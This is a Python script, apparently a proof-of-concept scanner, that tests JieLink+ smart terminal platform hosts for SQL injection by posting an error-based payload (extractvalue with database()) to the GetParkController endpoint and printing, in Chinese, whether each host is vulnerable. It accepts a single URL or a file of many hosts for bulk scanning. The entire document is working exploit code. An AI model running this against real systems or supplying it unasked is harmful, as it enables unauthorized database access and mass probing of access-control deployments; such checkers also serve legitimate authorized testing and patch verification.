import requests
import argparse

def send_request(host):
    url = f"{host}/mobile/Remote/GetParkController"
    
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0",
        "Accept": "application/json, text/plain, */*",
        "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
        "Accept-Encoding": "gzip, deflate",
        "X-Requested-With": "XMLHttpRequest",
        "Connection": "close",
        "Cookie": "DefaultSystem=Mobile; ASP.NET_SessionId=533gfzuselgriachdgogkug5",
        "Content-Type": "application/x-www-form-urlencoded"
    }
    
    data = {
        "deviceId": "1'and/**/extractvalue(1,concat(char(126),database()))and'"
    }

    try:
        response = requests.post(url, headers=headers, data=data, verify=False, timeout=10)
        # 检查响应内容是否包含特定字符串
        if "XPATH syntax error" in response.text:
            print(f"[+]: {host} : 存在JieLink+智能终端操作平台sql注入漏洞")
        else:
            print(f"[-]: {host} : 不存在JieLink+智能终端操作平台sql注入漏洞")
    except requests.exceptions.Timeout:
        print(f"[!]: {host} : 请求超时")
    except requests.exceptions.RequestException as e:
        print(f"[!]: {host} : 请求失败: {e}")

def main():
    parser = argparse.ArgumentParser(description="JieLink+智能终端操作平台存在sql注入漏洞")
    parser.add_argument("-u", "--url", help="Specify a single host")
    parser.add_argument("-l", "--list", help="Specify a file containing multiple hosts")

    args = parser.parse_args()

    if args.url:
        send_request(args.url)
    elif args.list:
        with open(args.list, 'r') as file:
            hosts = file.readlines()
            for host in hosts:
                send_request(host.strip())
    else:
        print("Please specify a single host with -u or a file with -l")

if __name__ == "__main__":
    main()
